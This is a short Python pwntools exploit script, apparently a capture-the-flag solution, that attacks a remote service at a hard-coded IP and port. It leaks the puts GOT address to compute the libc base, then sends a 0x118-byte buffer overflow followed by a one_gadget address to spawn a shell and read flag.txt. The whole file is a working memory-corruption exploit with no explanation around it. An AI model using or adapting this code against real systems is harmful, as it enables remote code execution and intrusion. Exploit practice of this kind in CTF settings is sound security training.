from pwn import *

r = remote('140.110.112.218', 2123)

puts_got = 0x601018
r.recvuntil(":")
r.sendline("0x601018")

puts_got_value = int(r.recvuntil(b'\n').split(b':')[1].strip(), 16)

print(hex(puts_got_value))

puts_libc = 0x000000000006f690
libc_base = puts_got_value - puts_libc

print(hex(libc_base))

one_gadget = libc_base + 0x45216
r.recvuntil(":")
r.sendline(b'a'*(0x118) + p64(one_gadget))
r.sendline("cat flag.txt")

r.interactive()